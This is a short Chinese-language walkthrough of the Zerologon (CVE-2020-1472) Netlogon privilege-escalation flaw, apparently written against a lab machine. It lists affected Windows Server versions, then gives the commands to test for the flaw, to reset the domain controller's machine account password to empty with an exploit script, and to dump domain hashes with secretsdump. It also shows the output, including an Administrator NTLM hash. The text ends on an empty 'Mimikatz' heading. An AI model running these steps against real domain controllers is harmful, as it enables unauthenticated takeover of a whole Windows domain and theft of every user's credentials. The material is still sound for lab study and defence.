# CVE-2020-1472 NetLogon权限提升漏洞

通过该漏洞，未经身份验证的攻击者只需要能访问城控的135端口即可通过 Netlogon 远程协议连接域控并重置域控机器账户的 Hash，从而导致攻击者可以利用域控的机器账户导出域内所有用户的Hash(域控的机器账户默认具有 DCSync 权限)，进而接管整个域。该漏洞存在的原因是 Netlogon 协议认证的加密模块存在缺陷，导致攻击者可以在没有凭据的情况下通过认证。通过认证后，调用 Netlogon 协议中 RPC 函数
NetrServerPasswordSet2 来重置城控机器账户的 Hash，从而接管全域。

影响版本：

```
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)
```

先判断是否存在漏洞（第一个参数是域控的主机名）：

```python
python3.10 zerologon_tester.py MULTIMASTER 10.10.10.179
```

有漏洞就可以攻击：

```shell
python3.10 cve-2020-1472-exploit.py MULTIMASTER 10.10.10.179
Performing authentication attempts...
======================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

然后dump hash：

```shell
python3.10 secretsdump.py   -just-dc -no-pass MULTIMASTER\$@10.10.10.179
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:69cbf4a9b7415c9e1caf93d51d971be0:::
```





Mimikatz：

